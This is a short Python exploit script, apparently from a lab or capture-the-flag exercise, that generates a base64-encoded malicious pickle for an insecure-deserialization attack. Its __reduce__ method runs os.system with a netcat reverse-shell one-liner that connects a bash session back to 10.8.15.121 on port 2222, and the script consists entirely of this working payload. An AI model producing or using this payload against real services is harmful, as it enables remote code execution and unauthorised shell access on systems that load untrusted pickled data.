import pickle
import sys
import base64

cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.15.121 2222 >/tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(cmd,))

print(base64.b64encode(pickle.dumps(rce())))
